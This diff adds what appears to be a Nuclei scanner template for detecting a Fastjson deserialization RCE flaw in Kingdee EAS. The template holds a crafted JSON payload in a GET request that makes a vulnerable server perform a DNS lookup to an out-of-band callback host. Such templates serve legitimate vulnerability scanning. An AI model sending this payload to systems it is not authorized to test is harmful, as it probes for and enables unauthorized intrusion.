@@ -1,0 +1,21 @@
+id: kingdee-eas-fastjson-rce
+info:
+  name: Kingdee EAS Fastjson Deserialization RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Kingdee EAS versions under 8.5 are vulnerable to an unauthorized Fastjson deserialization vulnerability. Attackers can execute malicious Fastjson payloads to achieve remote code execution.
+  tags: code-execution,rce,fastjson
+  reference:
+    - https://www.kingdee.com/
+http:
+  - raw:
+      - |
+        GET /easportal/tools/appUtil.jsp?list={"x":{"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}} HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
